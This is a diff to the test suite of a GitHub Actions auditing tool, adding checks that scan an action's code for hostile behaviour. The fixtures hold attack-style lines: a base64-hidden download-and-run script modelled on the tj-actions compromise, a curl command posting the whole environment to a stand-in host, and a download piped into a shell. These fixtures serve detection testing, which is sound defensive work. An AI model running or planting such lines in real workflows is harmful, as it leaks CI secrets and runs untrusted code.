@@ -7,6 +7,7 @@ commit, an action.yml that runs an unpinned image or unpinned steps; and what is
 not checked is said (the rate limit, the call budget, a ref that is an expression).
 """
 
+import base64
 import io
 import json
 import os
@@ -59,6 +60,10 @@ class Base(unittest.TestCase):
         return [(f.kind, f.line) for f in rep.findings]
 
 
+def api_calls(gh):
+    return [u for u in gh.calls if u.startswith(fx.API)]
+
+
 class PinnedTests(Base):
     def test_a_release_commit_is_quiet_and_costs_two_calls(self):
         r = release_repo()
@@ -66,7 +71,9 @@ class PinnedTests(Base):
         self.assertEqual(rep.findings, [])
         self.assertTrue(rep.complete)
         self.assertEqual(rep.checked, 1)
-        self.assertEqual(len(self.gh.calls), 2)                 # the tags (a tip matches), then action.yml
+        self.assertEqual(len(api_calls(self.gh)), 2)            # the tags (a tip matches), then action.yml
+        # and the commit's archive, from codeload (not an API call)
+        self.assertEqual(self.gh.calls[2:], [f"https://codeload.github.com/o/act/tar.gz/{r.shas[1]}"])
         self.assertEqual(rep.resolved, {f"o/act@{r.shas[1]}": r.shas[1]})
 
     def test_a_commit_of_the_default_branch_that_is_not_tagged(self):
@@ -337,16 +344,17 @@ class NotCheckedTests(Base):
         self.assertTrue(rep.complete)
         self.assertEqual(rep.checked, 0)
 
-    def test_only_the_api_host_is_asked_and_names_are_quoted(self):
+    def test_only_the_api_and_archive_hosts_are_asked_and_names_are_quoted(self):
         r = release_repo()
         self.audit(workflow("o/act@releases/v1", "o/act/sub@v1"), r)
         for url in self.gh.calls:
-            self.assertTrue(url.startswith("https://api.github.com/repos/o/act"), url)
+            self.assertTrue(url.startswith(("https://api.github.com/repos/o/act",
+                                            "https://codeload.github.com/o/act/tar.gz/")), url)
 
     def test_the_rate_limit_stops_the_run_and_leaves_the_rest_unchecked(self):
         a, b = release_repo("o/a"), release_repo("o/b")
         rep = self.audit(workflow(f"o/a@{a.shas[1]}", f"o/b@{b.shas[1]}", "o/b@v1"), a, b, limit=2)
-        self.assertEqual(len(self.gh.calls), 3)                  # nothing is asked after the answer that said stop
+        self.assertEqual(len(api_calls(self.gh)), 3)            # nothing is asked after the answer that said stop
         self.assertEqual(rep.findings, [])
         self.assertEqual([u for u, _ in rep.incomplete], [f"o/b@{b.shas[1]}", "o/b@v1"])
         self.assertIn("rate limit reached", rep.incomplete[0][1])
@@ -418,15 +426,31 @@ class ActionYmlTests(Base):
         r = self.repo_with(fx.action_yml("docker", image=f"docker://ghcr.io/o/img@{DIGEST}"))
         self.assertEqual(self.audit(workflow(f"o/act@{r.sha}"), r).findings, [])
         r = self.repo_with(fx.action_yml("docker", image="Dockerfile"))
+        r.files[(r.sha, "Dockerfile")] = f"FROM ghcr.io/o/base@{DIGEST}\n".encode()
         rep = self.audit(workflow(f"o/act@{r.sha}"), r)
         self.assertEqual(rep.findings, [])
+        self.assertEqual(rep.actions[f"o/act@{r.sha}"]["code"]["verdict"], "OK")
+        # without the code check, the Dockerfile is not read, and that is said
+        rep = self.audit(workflow(f"o/act@{r.sha}"), r, code=False)
         self.assertIn("builds its image from Dockerfile", rep.notes[0][1])
+        self.assertIn("--no-code", rep.notes[0][1])
+        self.assertNotIn("code", rep.actions[f"o/act@{r.sha}"])
 
     def test_a_node_action_reports_what_runs(self):
-        r = self.repo_with(fx.action_yml("node20", main="dist/index.js", pre="dist/pre.js", post="dist/post.js"))
+        r = self.repo_with(fx.action_yml("node20", main="dist/index.js", pre="dist/pre.js", post="dist/post"))
+        for name in ("dist/index.js", "dist/pre.js", "dist/post.js"):
+            r.files[(r.sha, name)] = b"module.exports = 1;\n"
         rep = self.audit(workflow(f"o/act@{r.sha}"), r)
-        self.assertEqual(rep.actions[f"o/act@{r.sha}"], {"using": "node20", "pre": True, "post": True})
+        entry = rep.actions[f"o/act@{r.sha}"]
+        self.assertEqual({k: entry[k] for k in ("using", "pre", "post")}, {"using": "node20", "pre": True, "post": True})
+        self.assertEqual(entry["code"]["runs"], {"runs.pre": "dist/pre.js", "runs.main": "dist/index.js",
+                                                 "runs.post": "dist/post.js"})     # (node finds dist/post.js)
+        self.assertEqual((entry["code"]["verdict"], entry["code"]["commit"]), ("OK", r.sha))
         self.assertEqual(rep.findings, [])
+        # a script action.yml names that the commit does not hold is said
+        r2 = self.repo_with(fx.action_yml("node20", main="dist/index.js"))
+        rep = self.audit(workflow(f"o/act@{r2.sha}"), r2)
+        self.assertIn("its runs.main names dist/index.js, which is not in the commit", rep.notes[0][1])
 
     def test_a_composite_action_with_an_unpinned_step(self):
         inner = release_repo("o/inner")
@@ -470,7 +494,8 @@ class ActionYmlTests(Base):
         r.commit(c, branch="main")
         rep = self.audit(workflow(f"o/mono/build@{c}", f"o/mono/missing@{c}"), r)
         self.assertEqual([f.kind for f in rep.findings], ["docker-unpinned"])
-        self.assertIn("no action.yml or action.yaml", rep.notes[0][1])
+        self.assertTrue(any("no action.yml or action.yaml" in n for _u, n in rep.notes), rep.notes)
+        self.assertEqual(self.gh.calls.count(f"https://codeload.github.com/o/mono/tar.gz/{c}"), 1)
 
     def test_a_reusable_workflow_gets_the_ref_signals_and_no_action_yml(self):
         r = release_repo()
@@ -479,6 +504,154 @@ class ActionYmlTests(Base):
         rep = self.audit(text, r)
         self.assertEqual(self.kinds(rep), [("impostor", 4)])
         self.assertFalse([u for u in self.gh.calls if "/contents/" in u])
+
+
+# An inert stand-in for what the tj-actions/changed-files release of March 2025 added to its dist/index.js:
+# a script kept in base64, written to a file and run; this one fetches from a documentation address (RFC 5737).
+DECODED_RUN = ("const fs = require('fs');\nconst cp = require('child_process');\nfunction update() {\n"
+               "  const s = Buffer.from('" + base64.b64encode(b"curl -sSf https://203.0.113.7/x.py | python3").decode()
+               + "', 'base64').toString();\n  fs.writeFileSync('/tmp/run.sh', s);\n  cp.execSync('bash /tmp/run.sh');\n}\n"
+               "update();\n")
+ENV_SENT = 'curl -sS -X POST --data "$(env | base64 -w0)" https://collect.example.invalid/x\n'
+
+
+class CodeTests(Base):
+    """N-4: the action's own code at the commit it resolves to."""
+
+    def repo_with(self, files, name="o/act"):
+        r = fx.Repo(name)
+        c = r.commit(files=files)
+        r.commit(c, branch="main")
+        r.tag("v1.0.0", c)
+        r.sha = c
+        return r
+
+    def code(self, rep):
+        return [f for f in rep.findings if f.kind == "code"]
+
+    def test_a_script_main_writes_and_runs_is_found_at_the_pinned_commit(self):
+        r = self.repo_with({"action.yml": fx.action_yml("node20", main="dist/index.js"), "dist/index.js": DECODED_RUN})
+        rep = self.audit(workflow(f"o/act@{r.sha}"), r)
+        found = self.code(rep)
+        self.assertEqual([(f.kind, f.line, f.detail["rule"], f.detail["sev"]) for f in found],
+                         [("code", 7, "SC-IMPORT-RISK", "CRITICAL")])
+        rule = actions.rule("code", found[0].detail)
+        self.assertEqual((rule["id"], rule["sev"], rule["type"]), ("SC-IMPORT-RISK", "CRITICAL", "HOTSPOT"))
+        self.assertIn(f"In the code of o/act at {r.sha[:12]}, dist/index.js:", rule["msg"])
+        self.assertIn("runs when the action runs (runs.main)", rule["msg"])
+        self.assertIn("writes code it decodes to a file and runs it with bash", rule["msg"])
+        self.assertEqual(rep.actions[f"o/act@{r.sha}"]["code"]["verdict"], "SUSPICIOUS")
+        self.assertTrue(rep.complete)
+
+    def test_npm_scripts_and_files_nothing_runs_are_not_the_actions(self):
+        r = self.repo_with({"action.yml": fx.action_yml("node20", main="dist/index.js"),
+                            "dist/index.js": "module.exports = 1;\n",
+                            "package.json": json.dumps({"name": "x", "scripts": {"postinstall": ENV_SENT}}),
+                            "__tests__/fixture.sh": ENV_SENT})
+        rep = self.audit(workflow(f"o/act@{r.sha}"), r)
+        self.assertEqual(rep.findings, [])
+        self.assertEqual(rep.actions[f"o/act@{r.sha}"]["code"]["verdict"], "OK")
+
+    def test_a_composite_step_that_sends_the_environment(self):
+        yml = "name: x\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: |\n        echo start\n        " + ENV_SENT
+        r = self.repo_with({"action.yml": yml})
+        found = self.code(self.audit(workflow(f"o/act@{r.sha}"), r))
+        self.assertEqual([(f.detail["rule"], f.detail["sev"], f.detail["name"], f.detail["file"], f.detail["at"])
+                          for f in found], [("SC-INSTALL-HOOK", "CRITICAL", "Action step", "action.yml", 7)])
+        self.assertIn("Step 1 of the action sends environment variables over the network (the whole environment)",
+                      found[0].detail["msg"])
+
+    def test_a_composite_step_that_pipes_a_download_into_a_shell_is_major(self):
+        yml = "name: x\nruns:\n  using: composite\n  steps:\n    - run: ${{ github.action_path }}/install.sh\n      shell: bash\n"
+        r = self.repo_with({"action.yml": yml, "install.sh": "#!/bin/sh\ncurl -sfL https://example.invalid/i.sh | sh -s -- -b \"$D\"\n"})
+        found = self.code(self.audit(workflow(f"o/act@{r.sha}"), r))
+        self.assertEqual([(f.detail["sev"], f.detail["at"]) for f in found], [("MAJOR", 5)])
+        self.assertIn("Step 1 of the action runs install.sh, which pipes a download into a shell", found[0].detail["msg"])
+        self.assertIn("Codecov", actions.rule("code", found[0].detail)["why"])
+
+    def test_a_step_runs_the_actions_files_only_by_its_path(self):
+        # ./local.sh is in the job's workspace (the user's repository), not the action's file of that name
+        yml = "name: x\nruns:\n  using: composite\n  steps:\n    - run: ./local.sh\n      shell: bash\n"
+        r = self.repo_with({"action.yml": yml, "local.sh": ENV_SENT})
+        rep = self.audit(workflow(f"o/act@{r.sha}"), r)
+        self.assertEqual(self.code(rep), [])
+        self.assertEqual(rep.actions[f"o/act@{r.sha}"]["code"]["runs"], {})
+
+    def test_a_docker_actions_base_images_and_entrypoint(self):
+        yml = fx.action_yml("docker", image="Dockerfile")
+        dockerfile = ("FROM golang:1.22 AS build\nRUN go build -o /x .\nFROM ghcr.io/o/base:2\nFROM alpine:3.20\n"
+                      "COPY --from=build /x /x\nCOPY entrypoint.sh /entrypoint.sh\nENTRYPOINT [\"/entrypoint.sh\"]\n")
+        r = self.repo_with({"action.yml": yml, "Dockerfile": dockerfile, "entrypoint.sh": "#!/bin/sh\n" + ENV_SENT})
+        rep = self.audit(workflow(f"o/act@{r.sha}"), r)
+        bases = [f for f in rep.findings if f.kind == "docker-unpinned"]
+        self.assertEqual([(f.detail["image"], f.detail["dockerfile"], actions.rule(f.kind, f.detail)["sev"]) for f in bases],
+                         [("golang:1.22", "Dockerfile:1", "MINOR"), ("ghcr.io/o/base:2", "Dockerfile:3", "MAJOR"),
+                          ("alpine:3.20", "Dockerfile:4", "MINOR")])
+        self.assertIn("builds its image from ghcr.io/o/base:2 (Dockerfile:3)", actions.rule(bases[1].kind, bases[1].detail)["msg"])
+        found = self.code(rep)
+        self.assertEqual([(f.detail["sev"], f.detail["name"], f.detail["file"], f.detail["at"]) for f in found],
+                         [("CRITICAL", "Action entrypoint", "Dockerfile", 7)])
+        self.assertIn("The action's ENTRYPOINT runs entrypoint.sh, which sends environment variables",
+                      found[0].detail["msg"])
+
+    def test_an_archive_of_another_commit_or_none_leaves_the_action_incomplete(self):
+        r = self.repo_with({"action.yml": fx.action_yml()})
+        gh = fx.FakeGitHub(r)
+        real = gh.archive_of
+        gh.archive_of = lambda repo, sha, what: fx.archive(repo.full_name, "f" * 40, {"action.yml": fx.action_yml()})
+        rep = actions.audit_text(workflow(f"o/act@{r.sha}"), env={}, http=gh)
+        self.assertEqual(rep.findings, [])
+        self.assertIn(f"says it is for commit {'f' * 40}", rep.incomplete[0][1])
+        self.assertEqual(rep.actions[f"o/act@{r.sha}"]["code"]["verdict"], "INCOMPLETE")
+        gh = fx.FakeGitHub(r)
+        gh.broken["/o/act/tar.gz/"] = 502
+        rep = actions.audit_text(workflow(f"o/act@{r.sha}"), env={}, http=gh)
+        self.assertEqual([u for u, _ in rep.incomplete], [f"o/act@{r.sha}"])
+        self.assertIn("its code could not be fetched", rep.incomplete[0][1])
+        self.assertTrue(callable(real))
+
+    def test_code_not_read_whole_is_incomplete(self):
+        yml = "name: x\nruns:\n  using: composite\n  steps:\n    - run: print 1\n      shell: perl {0}\n"
+        r = self.repo_with({"action.yml": yml})
+        rep = self.audit(workflow(f"o/act@{r.sha}"), r)
+        self.assertEqual(rep.findings, [])
+        self.assertIn("was not read whole", rep.incomplete[0][1])
+        self.assertIn("perl", rep.incomplete[0][1])
+
+    def test_one_archive_per_commit_and_the_runs_budget(self):
+        files = {"a/action.yml": fx.action_yml("node20", main="i.js"), "a/i.js": "1;\n",
+                 "b/action.yml": fx.action_yml("node20", main="../a/i.js")}
+        r = self.repo_with(files, name="o/mono")
+        rep = self.audit(workflow(f"o/mono/a@{r.sha}", f"o/mono/b@{r.sha}"), r)
+        self.assertEqual([u for u in self.gh.calls if "codeload" in u], [f"https://codeload.github.com/o/mono/tar.gz/{r.sha}"])
+        self.assertEqual(rep.actions[f"o/mono/b@{r.sha}"]["code"]["runs"], {"runs.main": "a/i.js"})
+        with mock.patch.object(actions, "MAX_CODE_SCANS", 0):
+            rep = self.audit(workflow(f"o/mono/a@{r.sha}"), r)
+        self.assertIn("more than 0 actions' archives in one run", rep.incomplete[0][1])
+        self.assertFalse([u for u in self.gh.calls if "codeload" in u])
+
+    def test_a_nested_actions_code_is_read_and_says_through_what(self):
+        inner = self.repo_with({"action.yml": fx.action_yml("node20", main="i.js"), "i.js": DECODED_RUN}, name="o/inner")
+        outer = self.repo_with({"action.yml": fx.action_yml("composite", steps=[f"o/inner@{inner.sha}"])})
+        found = self.code(self.audit(workflow(f"o/act@{outer.sha}"), outer, inner))
+        self.assertEqual([(f.detail["repo"], f.detail["via"]) for f in found], [("inner", [f"o/act@{outer.sha}"])])
+        self.assertIn(f"(through o/act@{outer.sha})", actions.rule("code", found[0].detail)["msg"])
+
+    def test_with_a_token_the_archive_comes_through_the_api(self):
+        token = "ghp_NotARealTokenJustTestText1234567890"
+        r = self.repo_with({"action.yml": fx.action_yml("node20", main="i.js"), "i.js": "1;\n"})
+        gh = fx.FakeGitHub(r)
+        rep = actions.audit_text(workflow(f"o/act@{r.sha}"), env={"GITHUB_TOKEN": token}, http=gh)
+        self.assertIn(f"https://api.github.com/repos/o/act/tarball/{r.sha}", gh.calls)
+        self.assertFalse([u for u in gh.calls if "codeload" in u])
+        self.assertEqual(rep.actions[f"o/act@{r.sha}"]["code"]["verdict"], "OK")
+        self.assertNotIn(token, json.dumps(rep.to_json()))
+
+    def test_no_code(self):
+        r = self.repo_with({"action.yml": fx.action_yml("node20", main="dist/index.js"), "dist/index.js": DECODED_RUN})
+        rep = self.audit(workflow(f"o/act@{r.sha}"), r, code=False)
+        self.assertEqual(rep.findings, [])
+        self.assertFalse([u for u in self.gh.calls if "codeload" in u])
 
 
 class RuleTests(unittest.TestCase):
@@ -503,6 +676,21 @@ class RuleTests(unittest.TestCase):
             self.assertTrue(all(isinstance(rule[k], str) and rule[k] for k in ("msg", "why", "fix", "name", "ref")), kind)
             ids.add(rule["id"])
         self.assertEqual(len(ids), 6)
+
+    def test_a_code_finding_carries_the_scans_own_rule(self):
+        d = dict(self.D, path="sub", sha="c" * 40, rule="SC-USE-RISK", name="Hostile code the package runs when used",
+                 sev="CRITICAL", msg="lib/x.js opens a reverse shell.", why="", fix="", ref="", file="lib/x.js", at=3)
+        rule = actions.rule("code", d)
+        self.assertEqual(sorted(rule), ["fix", "id", "msg", "name", "ref", "sev", "type", "why"])
+        self.assertEqual((rule["id"], rule["sev"]), ("SC-USE-RISK", "CRITICAL"))
+        self.assertEqual(rule["msg"], f"In the code of o/r/sub at {'c' * 12}, lib/x.js:3: lib/x.js opens a reverse shell.")
+        self.assertTrue(rule["why"] and rule["fix"] and rule["ref"])        # the action's own when the issue has none
+
+    def test_an_official_image_at_a_version_tag_is_minor(self):
+        for image, sev in (("docker://alpine:3.20", "MINOR"), ("docker://docker.io/library/node:22-slim", "MINOR"),
+                           ("docker://alpine", "MAJOR"), ("docker://alpine:latest", "MAJOR"),
+                           ("docker://ghcr.io/o/img:1.2", "MAJOR"), ("docker://o/img:1.2", "MAJOR")):
+            self.assertEqual(actions.rule("docker-unpinned", dict(self.D, image=image))["sev"], sev, image)
 
 
 class CommandTests(Base):
@@ -556,6 +744,21 @@ class CommandTests(Base):
         self.assertEqual(self.run_main(["--pins", book, wf], r)[0], 1)
         self.assertEqual(self.run_main(["--pins", book, "--accept-moved", wf], r)[0], 0)
         self.assertEqual(self.run_main(["--pins", book, wf], r)[0], 0)
+
+    def test_the_code_check_and_no_code(self):
+        r = fx.Repo("o/act")
+        c = r.commit(files={"action.yml": fx.action_yml("node20", main="i.js"), "i.js": DECODED_RUN})
+        r.commit(c, branch="main")
+        wf = self.write(workflow(f"o/act@{c}"))
+        code, out, _, gh = self.run_main(["--no-pins", wf], r)
+        doc = json.loads(out)[0]
+        self.assertEqual(code, 1)
+        self.assertEqual([(f["kind"], ru["id"]) for f, ru in zip(doc["findings"], doc["rules"])],
+                         [("code", "SC-IMPORT-RISK")])
+        self.assertEqual(doc["actions"][f"o/act@{c}"]["code"]["verdict"], "SUSPICIOUS")
+        code, out, _, gh = self.run_main(["--no-pins", "--no-code", wf], r)
+        self.assertEqual((code, json.loads(out)[0]["findings"]), (0, []))
+        self.assertFalse([u for u in gh.calls if "codeload" in u])
 
     def test_the_budget_option(self):
         r = release_repo()
